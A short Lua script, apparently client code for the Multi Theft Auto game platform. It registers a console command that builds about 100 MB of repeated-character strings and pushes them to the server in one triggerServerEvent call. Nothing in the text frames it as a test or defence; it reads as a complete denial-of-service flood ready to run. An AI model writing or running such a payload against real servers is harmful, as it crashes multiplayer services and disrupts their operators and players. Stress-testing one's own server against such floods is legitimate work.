addCommandHandler("shol",function()
    local tab={}
    for i=1,1000 do 
        table.insert(tab,string.rep("s",100000))
    end
    triggerServerEvent("shol",localPlayer,tab)
end)